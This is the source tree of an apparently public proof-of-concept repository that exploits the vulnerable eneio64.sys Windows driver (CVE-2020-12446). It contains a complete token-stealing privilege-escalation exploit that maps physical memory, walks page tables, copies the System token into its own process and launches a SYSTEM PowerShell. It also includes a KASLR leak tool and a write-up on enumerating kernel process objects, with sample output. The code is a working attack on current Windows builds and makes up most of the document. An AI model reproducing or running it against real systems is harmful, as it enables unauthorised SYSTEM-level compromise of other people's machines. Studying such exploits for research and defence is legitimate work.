Project Path: arc_Xacone_Eneio64-Driver-Exploit_mlki4z2r

Source Tree:

```txt
arc_Xacone_Eneio64-Driver-Exploit_mlki4z2r
├── README.md
├── exploit
│   ├── main.cpp
│   └── utils.h
├── kaslr
│   └── main.cpp
├── procs
│   ├── README.md
│   └── main.cpp
└── sd.py

```

`README.md`:

```md
# Exploit for eneio64.sys Kernel Driver - Turning Physical Memory R/W into Virtual Memory R/W

- This exploit targets [eneio64.sys](https://www.loldrivers.io/drivers/90ecbbf7-b02f-424d-8b7d-56cc9e3b5873/), a vulnerable driver offering read/write primitives on the system's physical memory. The associated CVE is CVE-2020-12446. I'm not the one behind this CVE discovery, all credit goes to [@ihack4falafel](https://github.com/ihack4falafel).
- This exploit targets Windows 11 22H2. Check the ``nt!HalpLMStub`` & `EPROCESS`/`KTHREAD` offsets if you're targeting another Windows version/build.
- eneio64.sys is currently (March 8, 2025) tolerated by HVCI which reinforces the Vulnerable Driver Blocklist. eneio64.sys can be loaded on Windows 11 23H2 and 24H2 as well.
- The main purpose of this exploit is to demonstrate how to map virtual addresses to physical addresses using the same virtual-to-physical translation process as the OS. [A walkthrough of this POC is published here](https://xacone.github.io/eneio-driver.html).
- The exploit presented here enables privilege elevation via token theft.
- For educational purposes only.

---



https://github.com/user-attachments/assets/aa57cb23-4bbf-4b69-995e-beca123c9904


```

`exploit/main.cpp`:

```cpp
#include <Windows.h>
#include <iostream>
#include <psapi.h>
#include <tchar.h>
#include <ntstatus.h>

#include "utils.h"

#pragma comment( lib, "ntdll.lib" )

#define DEVICE_NAME "\\\\.\\GLCKIo"
#define IOCTL_WINIO_MAPPHYSTOLIN 0x80102040
#define IOCTL_WINIO_UNMAPPHYSADDR 0x80102044

#define EPROCESS_IMGEFILENAME_OFFSET 0x5a8
#define KTHREAD_PROCESS_OFFSET 0x220
#define EPROCESS_TOKEN_OFFSET 0x4b8

typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

NtQuerySystemInformation_t NtQuerySystemInformation2;

typedef LARGE_INTEGER PHYSICAL_ADDRESS;

typedef struct _INPUTBUF
{
    ULONG64 Size;
    ULONG64 val2;
    ULONG64 val3;
    ULONG64 MappingAddress;
    ULONG64 val5;

} INPUTBUF;

typedef struct _SYSTEM_HANDLE
{
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG HandleCount;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_BIGPOOL_ENTRY
{
    union {
        PVOID VirtualAddress;
        ULONG_PTR NonPaged : 1;
    };
    ULONG_PTR SizeInBytes;
    union {
        UCHAR Tag[4];
        ULONG TagUlong;
    };
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
    ULONG Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ANYSIZE_ARRAY];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;

void restart_process() {
    wchar_t path[MAX_PATH];
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) {
        fprintf(stderr, "Error retrieving executable path: %lu\n", GetLastError());
        return;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessW(
        path,
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        wprintf(L"New instance started (PID: %lu)\n", pi.dwProcessId);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        wprintf(L"Old instance terminated (PID: %lu)\n", GetCurrentProcessId());
        ExitProcess(0);
    }
    else {
        fprintf(stderr, "Error starting new instance: %lu\n", GetLastError());
    }
}

ULONG64 GetNtosBase() {

    LPVOID driverBaseAddresses[1024];
    DWORD sizeRequired;

    if (EnumDeviceDrivers(driverBaseAddresses, sizeof(driverBaseAddresses), &sizeRequired)) {
        return (ULONG64)driverBaseAddresses[0];
    }

    return NULL;
}

void PrintErrorMessage(
    DWORD errorCode
) {

    LPWSTR errorMessage = NULL;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errorCode,
        0,
        (LPWSTR)&errorMessage,
        0, NULL);

    std::wcerr << L"Error: " << errorMessage << std::endl;

    LocalFree(errorMessage);
}

ULONG64 LeakSystemPoolAddr() {

    unsigned int len = sizeof(SYSTEM_BIGPOOL_INFORMATION);
    unsigned long out;
    PSYSTEM_BIGPOOL_INFORMATION info = NULL;
    NTSTATUS status = ERROR;

    do {
        len *= 2;
        info = (PSYSTEM_BIGPOOL_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
        status = NtQuerySystemInformation2(SystemBigPoolInformation, info, len, &out);
    } while (status == (NTSTATUS)0xc0000004);

    if (!SUCCEEDED(status)) {
        printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
        return NULL;
    }

    for (unsigned int i = 0; i < info->Count; i++) {
        SYSTEM_BIGPOOL_ENTRY poolEntry = info->AllocatedInfo[i];

        if (poolEntry.TagUlong != 0x636f7250) {
            continue;
        }

        printf("[*] Tag: %.*s, Address: 0x%llx, Size: 0x%x\n", 4, poolEntry.Tag, poolEntry.VirtualAddress, poolEntry.SizeInBytes);
        return (UINT64)poolEntry.VirtualAddress;
    }
    return NULL;
}

ULONG64 LeakKTHREAD(HANDLE dummythreadHandle)
{
    NTSTATUS retValue = STATUS_INFO_LENGTH_MISMATCH;

    int size = 1;
    PULONG outSize = 0;
    PSYSTEM_HANDLE_INFORMATION out = (PSYSTEM_HANDLE_INFORMATION)malloc(size);

    if (out == NULL)
    {
        goto exit;
    }

    do
    {
        free(out);
        size = size * 2;
        out = (PSYSTEM_HANDLE_INFORMATION)malloc(size);

        if (out == NULL)
        {
            goto exit;
        }

        retValue = NtQuerySystemInformation2(
            SystemHandleInformation,
            out,
            (ULONG)size,
            outSize
        );
    } while (retValue == STATUS_INFO_LENGTH_MISMATCH);

    if (retValue != STATUS_SUCCESS)
    {
        if (out != NULL)
        {
            free(out);
            goto exit;
        }
        goto exit;
    }
    else
    {
        for (ULONG i = 0; i < out->HandleCount; i++)
        {
            DWORD objectType = out->Handles[i].ObjectTypeNumber;

            if (out->Handles[i].ProcessId == GetCurrentProcessId())
            {
                if (dummythreadHandle == (HANDLE)out->Handles[i].Handle)
                {
                    ULONG64 kthreadObject = (ULONG64)out->Handles[i].Object;
                    free(out);
                    return kthreadObject;
                }
            }
        }
    }

exit:
    CloseHandle(dummythreadHandle);
    return (ULONG64)retValue;
}

UINT64 UnMapViewOfSection(HANDLE drv, INPUTBUF* map) {

    DWORD bytes_returned;

    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_UNMAPPHYSADDR,
        map,
        sizeof(INPUTBUF),
        map,
        sizeof(INPUTBUF),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );

    if (success) {
        std::cout << "[*] Physical memory section unmapped successfully" << std::endl;
        return TRUE;
    }

    std::cout << "[X] Failed to unmap physical memory section" << std::endl;
    return FALSE;

}

void randomFunction(void) { return; }

HANDLE createdummyThread(void)
{
    HANDLE dummyThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)randomFunction,
        NULL,
        CREATE_SUSPENDED,
        NULL
    );

    if (dummyThread == (HANDLE)-1) { goto exit; }
    else { return dummyThread; }

exit:
    return (HANDLE)-1;
}

// https://github.com/waryas/UMPMLib/blob/9da1806e3ae3ab9778ce4df886a04ff33ade6c17/MemoryOperationSample/PMemHelper.h#L258
UINT64 VirtualToPhysical(UINT64 cr3, UINT64 virtualAddr, BYTE* map) {

    UINT64 physicalAddr = 0;

    uint16_t PML4 = (uint16_t)((virtualAddr >> 39) & 0x1FF);
    uint16_t DirectoryPtr = (uint16_t)((virtualAddr >> 30) & 0x1FF);
    uint16_t Directory = (uint16_t)((virtualAddr >> 21) & 0x1FF);
    uint16_t Table = (uint16_t)((virtualAddr >> 12) & 0x1FF);

    uint64_t PML4E = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PML4E |= (uint64_t)(map[(cr3 + PML4 * sizeof(uint64_t)) + i]) << (i * 8);
    }

    std::cout << "\t[*] PML4E at " << std::hex << PML4E << std::endl;

    uint64_t PDPTE = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PDPTE |= (uint64_t)(map[((PML4E & 0xFFFF1FFFFFF000) + (uint64_t)DirectoryPtr * sizeof(uint64_t)) + i]) << (i * 8);
    }

    std::cout << "\t[*] PDPTE at " << std::hex << PDPTE << std::endl;

    if ((PDPTE & (1 << 7)) != 0) {
        physicalAddr = (PDPTE & 0xFFFFFC0000000) + (virtualAddr & 0x3FFFFFFF);
        return physicalAddr;
    }

    uint64_t PDE = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PDE |= (uint64_t)(map[((PDPTE & 0xFFFFFFFFFF000) + (uint64_t)Directory * sizeof(uint64_t)) + i]) << (i * 8);
    }

    std::cout << "\t[*] PDE at " << std::hex << PDE << std::endl;

    if ((PDE & (1 << 7)) != 0) {
        physicalAddr = (PDE & 0xFFFFFFFE00000) + (virtualAddr & 0x1FFFFF);
        return physicalAddr;
    }

    uint64_t PTE = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PTE |= (uint64_t)(map[((PDE & 0xFFFFFFFFFF000) + (uint64_t)Table * sizeof(uint64_t)) + i]) << (i * 8);
    }

    std::cout << "\t[*] PTE at " << std::hex << PTE << std::endl;

    physicalAddr == (PTE & 0xFFFFFFFFFF000) + (virtualAddr & 0xFFF);

    return physicalAddr;
}

UINT64 MapViewOfSection(HANDLE drv) {

    ULONG64 HalpLmStub = GetNtosBase() + 0x410660;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    if (GlobalMemoryStatusEx(&memoryStatus)) {
        printf("[*] Total physical memory: ~0x%llx bytes\n", memoryStatus.ullTotalPhys);
        printf("[*] Highest available physical memory address: ~0x%llx\n", memoryStatus.ullTotalPhys - 1);
    }
    else {
        printf("[X] Failed to retrieve memory information. Error: %lu\n", GetLastError());
    }

    PVOID out;
    DWORD bytes_returned;

    INPUTBUF* inbuf = (INPUTBUF*)malloc(sizeof(INPUTBUF));
    inbuf->Size = (memoryStatus.ullTotalPhys - 1);
    inbuf->val2 = 0;
    inbuf->val3 = 0;
    inbuf->MappingAddress = 0;
    inbuf->val5 = 0;

    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_MAPPHYSTOLIN,
        inbuf,
        sizeof(INPUTBUF),
        inbuf,
        sizeof(INPUTBUF),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );

    if (success) {

        wprintf(L"[*] Mapped %llx bytes at %p\n", inbuf->Size, inbuf->MappingAddress);

        BYTE* memory_data = (BYTE*)inbuf->MappingAddress;

        UINT64 halpLmStubPhysicalPointer = 0;
        DWORD_PTR physical_offset;

        std::cout << "[*] HalpLmStub at " << std::hex << HalpLmStub << std::endl;

        for (physical_offset = 0x0; physical_offset < 0x100000; physical_offset += sizeof(UINT64)) {

            UINT64 qword_value = 0;
            for (size_t i = 0; i < sizeof(UINT64); ++i) {
                qword_value |= (UINT64)(memory_data[physical_offset + i]) << (i * 8);
            }

            if (qword_value == HalpLmStub) {
                std::cout << "[*] Found nt!HalpLMStub in Low Stub at " << std::hex << qword_value << std::endl;
                halpLmStubPhysicalPointer = qword_value;
                break;
            }
        }

        if (halpLmStubPhysicalPointer == 0) {
            std::cout << "[X] Cannot find nt!HalpLMStub in Low Stub" << std::endl;
            exit(-1);
        }

        ULONG32 cr3 = 0;

        for (size_t i = 0; i < sizeof(ULONG32); ++i) {
            cr3 |= (ULONG32)(memory_data[physical_offset + 0x30 + i]) << (i * 8);
        }

        std::cout << "[*] Leaked CR3 -> " << std::hex << cr3 << std::endl;

        HANDLE dummyHandle = 0;
        ULONG64 kthread = 0x0;
        UINT64 kThreadPhysical = 0;

        do {
            dummyHandle = createdummyThread();
            kthread = LeakKTHREAD(dummyHandle);
            kThreadPhysical = VirtualToPhysical(cr3, kthread, memory_data);

        } while (kThreadPhysical == 0);

        std::cout << "[*] KTHREAD at " << std::hex << kthread << std::endl;

        if (kThreadPhysical != 0x0) {
            std::cout << "[*] KTHREAD Physical Address at " << kThreadPhysical << std::endl;
        }
        else {
            UnMapViewOfSection(drv, inbuf);
            std::cout << "[X] Failed to retrieve Physical Address for KTHREAD. Spawning new thread..." << std::endl;
        }

        UINT64 kprocessPointerPhysical = kThreadPhysical + KTHREAD_PROCESS_OFFSET;

        UINT64 currentProcAddr = 0;

        for (size_t i = 0; i < sizeof(UINT64); ++i) {
            currentProcAddr |= (UINT64)(memory_data[kprocessPointerPhysical + i]) << (i * 8);
        }

        std::cout << "[*] Current Proc EPROCESS at " << std::hex << currentProcAddr << std::endl;

        UINT64 currentProcPhysical = VirtualToPhysical(cr3, currentProcAddr, memory_data);

        if (currentProcPhysical == 0x0) {
            UnMapViewOfSection(drv, inbuf);
            std::cerr << "[X] Current Process EPROCESS not valid (= 0). Spawning new process..." << std::endl;
            restart_process();
        }

        std::cout << "[*] Current Proc EPROCESS Physical at " << std::hex << currentProcPhysical << std::endl;

        UINT64 sysProcPoolAddr = LeakSystemPoolAddr();

        UINT64 sysProcAddr = sysProcPoolAddr + 0x3f;

        std::cout << "[*] System EPROCESS at " << sysProcAddr << std::endl;

        UINT64 physicalSysPoolAddr = VirtualToPhysical(cr3, sysProcAddr, memory_data);

        std::cout << "[*] System EPROCESS physical addr at " << std::hex << physicalSysPoolAddr << std::endl;

        UINT64 systemTokenPhysAddr = physicalSysPoolAddr + EPROCESS_TOKEN_OFFSET;

        std::cout << "[*] System Token physical addr at " << std::hex << systemTokenPhysAddr << std::endl;

        UINT64 systemToken = 0;

        for (size_t i = 0; i < sizeof(UINT64); ++i) {
            systemToken |= (UINT64)(memory_data[systemTokenPhysAddr + i]) << (i * 8);
        }

        systemToken = (systemToken & 0xFFFFFFFFFFFFFFF0);

        std::cout << "[*] System Token : " << std::hex << systemToken << std::endl;

        UINT64 currentProcTokenPhysical = (currentProcPhysical + EPROCESS_TOKEN_OFFSET);

        std::cout << "[*] Current Process Token physical addr at " << std::hex << currentProcTokenPhysical << std::endl;

        for (int i = 0; i < sizeof(UINT64); ++i) {
            memory_data[currentProcTokenPhysical + i] = (BYTE)((systemToken >> (i * 8)) & 0xFF);
        }

        std::cout << "[*] Exploit Completed !" << std::endl;

        UnMapViewOfSection(drv, inbuf);

        system("powershell.exe");
    }
    else {
        std::cout << "[X] DeviceIoControl failed" << std::endl;
    }

    free(inbuf);

    return NULL;
}

int main() {

    NtQuerySystemInformation2 = (NtQuerySystemInformation_t)GetProcAddress(
        GetModuleHandleA("ntdll"),
        "NtQuerySystemInformation"
    );

    if (!NtQuerySystemInformation2) {
        printf("[X] Could not resolve NtQuerySystemInformation\n");
    }

    HANDLE drvHandle = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (drvHandle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        PrintErrorMessage(error);
        return 1;
    }
    else {
        std::cout << "[*] Successfully opened the device handle" << std::endl;
    }

    MapViewOfSection(drvHandle);

}

```

`exploit/utils.h`:

```h
#pragma once

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemMirrorMemoryInformation,
	SystemPerformanceTraceInformation,
	SystemObsolete0,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemVerifierAddDriverInformation,
	SystemVerifierRemoveDriverInformation,
	SystemProcessorIdleInformation,
	SystemLegacyDriverInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation,
	SystemTimeSlipNotification,
	SystemSessionCreate,
	SystemSessionDetach,
	SystemSessionInformation,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemVerifierThunkExtend,
	SystemSessionProcessInformation,
	SystemLoadGdiDriverInSystemSpace,
	SystemNumaProcessorMap,
	SystemPrefetcherInformation,
	SystemExtendedProcessInformation,
	SystemRecommendedSharedDataAlignment,
	SystemComPlusPackage,
	SystemNumaAvailableMemory,
	SystemProcessorPowerInformation,
	SystemEmulationBasicInformation,
	SystemEmulationProcessorInformation,
	SystemExtendedHandleInformation,
	SystemLostDelayedWriteInformation,
	SystemBigPoolInformation,
	SystemSessionPoolTagInformation,
	SystemSessionMappedViewInformation,
	SystemHotpatchInformation,
	SystemObjectSecurityMode,
	SystemWatchdogTimerHandler,
	SystemWatchdogTimerInformation,
	SystemLogicalProcessorInformation,
	SystemWow64SharedInformation,
	SystemRegisterFirmwareTableInformationHandler,
	SystemFirmwareTableInformation,
	SystemModuleInformationEx,
	SystemVerifierTriageInformation,
	SystemSuperfetchInformation,
	SystemMemoryListInformation,
	SystemFileCacheInformationEx,
	MaxSystemInfoClass

} SYSTEM_INFORMATION_CLASS;

```

`kaslr/main.cpp`:

```cpp
#include <Windows.h>
#include <iostream>
#include <psapi.h>
#include <tchar.h>
#include <ntstatus.h>

#pragma comment( lib, "ntdll.lib" )

#define DEVICE_NAME "\\\\.\\GLCKIo"
#define IOCTL_WINIO_MAPPHYSTOLIN 0x80102040
#define IOCTL_WINIO_UNMAPPHYSADDR 0x80102044

typedef struct _INPUTBUF
{
    ULONG64 Size;
    ULONG64 val2;
    ULONG64 val3;
    ULONG64 MappingAddress;
    ULONG64 val5;

} INPUTBUF;

UINT64 ReadMemoryU64(const UINT8* memory_data, UINT64 physical_address) {
    UINT64 value = 0;
    for (size_t i = 0; i < sizeof(UINT64); ++i) {
        value |= (UINT64)(memory_data[physical_address + i]) << (i * 8);
    }
    return value;
}

void PrintErrorMessage(
    DWORD errorCode
) {

    LPWSTR errorMessage = NULL;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errorCode,
        0,
        (LPWSTR)&errorMessage,
        0, NULL);

    std::wcerr << L"Error: " << errorMessage << std::endl;

    LocalFree(errorMessage);
}

UINT64 UnMapViewOfSection(HANDLE drv, INPUTBUF* map) {

    DWORD bytes_returned;

    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_UNMAPPHYSADDR,
        map,
        sizeof(INPUTBUF),
        map,
        sizeof(INPUTBUF),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );

    if (success) {
        std::cout << "[*] Physical memory section unmapped successfully" << std::endl;
        return TRUE;
    }

    std::cout << "[X] Failed to unmap physical memory section" << std::endl;
    return FALSE;
}

DWORD_PTR GetModuleEntryPoint(HMODULE hModule) {

    if (!hModule) {
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    return pNtHeaders->OptionalHeader.AddressOfEntryPoint;
}

UINT64 MapViewOfSection(HANDLE drv) {

    HMODULE hModule = LoadLibrary(L"ntoskrnl.exe");

    printf("[*] ntoskrnl.exe loaded at %llx\n", hModule);

    UINT64 kiSystemStartupOffset = ((UINT64)GetProcAddress(hModule, "KiSystemStartup") - (UINT64)hModule);

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    if (GlobalMemoryStatusEx(&memoryStatus)) {
        printf("[*] Total physical memory: ~0x%llx bytes\n", memoryStatus.ullTotalPhys);
        printf("[*] Highest available physical memory address: ~0x%llx\n", memoryStatus.ullTotalPhys - 1);
    }
    else {
        printf("[X] Failed to retrieve memory information. Error: %lu\n", GetLastError());
    }

    PVOID out;
    DWORD bytes_returned;

    INPUTBUF* inbuf = (INPUTBUF*)malloc(sizeof(INPUTBUF));
    inbuf->Size = (memoryStatus.ullTotalPhys - 1);
    inbuf->val2 = 0;
    inbuf->val3 = 0;
    inbuf->MappingAddress = 0;
    inbuf->val5 = 0;

    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_MAPPHYSTOLIN,
        inbuf,
        sizeof(INPUTBUF),
        inbuf,
        sizeof(INPUTBUF),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );

    if (success) {

        wprintf(L"[*] Mapped %llx bytes at %p\n", inbuf->Size, inbuf->MappingAddress);

        BYTE* memory_data = (BYTE*)inbuf->MappingAddress;

        UINT64 halpLmStubPhysicalPointer = 0;
        DWORD_PTR physical_offset;

        DWORD_PTR ntosEntryPoint = GetModuleEntryPoint(hModule);

        std::cout << "[*] NTOSKRNL.exe entry point at " << std::hex << ntosEntryPoint << std::endl;

        for (physical_offset = 0x0; physical_offset < 0x100000; physical_offset += sizeof(UINT64)) {

            UINT64 qword_value = ReadMemoryU64(memory_data, physical_offset);

            if ((qword_value & 0xFFFF) == (ntosEntryPoint & 0xFFFF)) {
                
                printf("[*] Found KiSystemStartup -> %p\n", qword_value);

                UINT64 supposedNtosBase = (qword_value - ntosEntryPoint);

                printf("[*] In a silly way, we can assume NTOS base address is %p\n", supposedNtosBase);

            }
        
        }

        Sleep(1000);

        UnMapViewOfSection(drv, inbuf);
    }
    else {
        std::cout << "[X] DeviceIoControl failed" << std::endl;
    }

    free(inbuf);

    return NULL;
}

int main() {

    HANDLE drvHandle = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (drvHandle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        PrintErrorMessage(error);
        return 1;
    }
    else {
        std::cout << "[*] Successfully opened the device handle" << std::endl;
    }

    MapViewOfSection(drvHandle);

}

```

`procs/README.md`:

```md
# Retrieving kernel process object addresses by exploiting a driver providing R/W to physical memory


By leveraging a vulnerable kernel driver that grants read access to the <b>physical memory layout</b>, it remains possible to retrieve the addresses of kernel objects for processes and threads. This technique is a continuation of what I’ve already covered in [this blog post](https://xacone.github.io/eneio-driver.html), which demonstrates how to simulate the process of resolving virtual addresses into physical ones from an exploit perspective, and in this [other post](https://xacone.github.io/kaslr_leak_24h2.html), which shows how to retrieve the kernel’s address by leveraging this type of driver. As in the two previous articles, the driver used here is [**eneio64.sys**](https://www.loldrivers.io/drivers/90ecbbf7-b02f-424d-8b7d-56cc9e3b5873/). As of today (05/09/2025), it is still tolerated by HVCI and can be loaded onto the kernel. The following technique was tested on Windows 11 versions 22H2 and 24H2.

We already have the kernel’s address, and it exports an interesting function: `KeCapturePersistentThreadState`. This way, its offset can be retrieved with `LoadLibraryA` and `GetProcAddress`, without the need to hardcode it.

```
2: kd> !dh -e nt
[...]

      1238 1200 FFFFF8079074F820 KeCancelTimer
      1239 1201 FFFFF807906CB0B0 KeCancelTimer2
      1240 1202 FFFFF807906A2B10 KeCapturePersistentThreadState  <----
      1241 1203 FFFFF807907F2900 KeCheckProcessorAffinityEx
      1242 1204 FFFFF80790870890 KeCheckProcessorGroupAffinity

[...]
```

``KeCapturePersistentThreadState`` uses the ``lea`` instruction twice to load the addresses of kernel variables into ``RAX``. Specifically, ``RAX`` is first set to the address of ``PsLoadedModuleList``, which is then stored at ``[RBX+0x20]``, and later ``RAX`` is set to the address of ``PsActiveProcessHead``. These are the first two instances of ``lea`` being used to load addresses into ``rax``.


```
2: kd> u KeCapturePersistentThreadState+0xfa
nt!KeCapturePersistentThreadState+0xfa:
fffff807`906a2c0a 488d052f20c500  lea     rax,[nt!PsLoadedModuleList (fffff807`912f4c40)]
fffff807`906a2c11 48894320        mov     qword ptr [rbx+20h],rax
fffff807`906a2c15 488d05e427c600  lea     rax,[nt!PsActiveProcessHead (fffff807`91305400)]
fffff807`906a2c1c 48894328        mov     qword ptr [rbx+28h],rax
fffff807`906a2c20 c7433064860000  mov     dword ptr [rbx+30h],8664h
fffff807`906a2c27 e864b61200      call    nt!KeQueryActiveProcessorCountEx (fffff807`907ce290)
fffff807`906a2c2c 4883a3080f000000 and     qword ptr [rbx+0F08h],0
fffff807`906a2c34 488d8b40100000  lea     rcx,[rbx+1040h]
```

These two variables are highly relevant:  
- `PsLoadedModuleList` is a pointer to a doubly linked list containing all modules initially loaded by the kernel.  
- `PsActiveProcessHead` is a pointer to the head of the doubly linked list of all active processes in the system.

The pointer of interest here is ``PsActiveProcessHead``; it points to the first element of the doubly linked list.

To retrieve its address, we locate the `lea rax`  opcodes (``48`` ``8d`` ``05``) and extract the offset for **RIP-relative access** while preserving the **offset’s endianness**.

```
0: kd> u KeCapturePersistentThreadState+0x105 L2
nt!KeCapturePersistentThreadState+0x105:
fffff805`e70a4835 488d05c40cc600  lea     rax,[nt!PsActiveProcessHead (fffff805`e7d05500)]
fffff805`e70a483c 48894328        mov     qword ptr [rbx+28h],rax

0: kd> ln fffff805`e70a483c+c60cc4
Browse module
Set bu breakpoint

(fffff805`e7d05500)   nt!PsActiveProcessHead   |  (fffff805`e7d05510)   nt!PsActiveSessionHead
Exact matches:

0: kd> dt _EPROCESS poi(fffff805`e7d05500)-0x1d8 ImageFileName
nt!_EPROCESS
   +0x338 ImageFileName : [15]  "System"
```

This trick can be implemented in C/C++ as shown below:

```c
  for (int i = 0; i < 1000; i++) {

      if (i >= 2 &&
          memory_data[KeCapPersThAddrPhysical + i - 2] == 0x48 &&
          memory_data[KeCapPersThAddrPhysical + i - 1] == 0x8D &&
          memory_data[KeCapPersThAddrPhysical + i] == 0x05) {
          occ++;
          int seq_offset = i - 2;

          //printf("\n\n[*] Found sequence 48 8D 05 (occurrence #%d) at offset 0x%x from function start\n", occ, seq_offset);

          if (occ == 2) {
              INT32 rip_offset = *(INT32*)&memory_data[KeCapPersThAddrPhysical + seq_offset + 3];
              UINT64 instruction_addr = KeCapPersThAddr + seq_offset;
              UINT64 rip_next = instruction_addr + 7;
              UINT64 target_addr = rip_next + rip_offset;
              PsActiveProcessHead = target_addr;
              break;
          }
      }

  }
```

The attached exploit obtains the addresses of the first *N* kernel process objects. In this case, it is set to 300, but the value can be modified as needed. The exploit also allows identifying its own kernel object.

```
C:\>C:\Temp\leak_proc_addr.exe

[*] Successfully opened the device handle
[*] Current process (exploit.exe) PID: 2900
[*] ntoskrnl.exe loaded at 00007FF6F0010000
[*] Total physical memory: ~0x1853d9000 bytes
[*] Highest available physical memory address: ~0x1853d8fff
[*] Mapped 1853d8fff bytes at 000001939A5D0000
[*] NTOSKRNL.exe entry point at 0xb423a0
[*] KeCapturePersistentThreadState offset is 0x2a2b10
[*] Found KiSystemStartup -> FFFFF80790F423A0
[*] In a silly way, we can assume NTOS base address is FFFFF80790400000
[*] CR3 (PML4) = 7d5000
[*] nt!KeCapturePersistentThreadState is at FFFFF807906A2B10
[*] nt!KeCapturePersistentThreadState physical address at 00000001006A2B10

[*] Walking PsActiveProcessHead:
[#00] EPROCESS: 0xffffa60f43493040 | PID: 4 | Name: System
[#01] EPROCESS: 0xffffa60f4355d080 | PID: 176 | Name: Secure System
[#02] EPROCESS: 0xffffa60f43579080 | PID: 216 | Name: Registry
[#03] EPROCESS: 0xffffa60f482640c0 | PID: 828 | Name: smss.exe
[#04] EPROCESS: 0xffffa60f4955e140 | PID: 988 | Name: csrss.exe
[#05] EPROCESS: 0xffffa60f497d6080 | PID: 1088 | Name: wininit.exe
[#06] EPROCESS: 0xffffa60f497a4080 | PID: 1096 | Name: csrss.exe
[#07] EPROCESS: 0xffffa60f49825080 | PID: 1160 | Name: winlogon.exe
[#08] EPROCESS: 0xffffa60f4984a140 | PID: 1240 | Name: services.exe
[#09] EPROCESS: 0xffffa60f49ca40c0 | PID: 1264 | Name: LsaIso.exe
[#10] EPROCESS: 0xffffa60f49ca7100 | PID: 1276 | Name: lsass.exe
[#11] EPROCESS: 0xffffa60f48314080 | PID: 1404 | Name: svchost.exe
[#12] EPROCESS: 0xffffa60f44e48200 | PID: 1432 | Name: fontdrvhost.ex
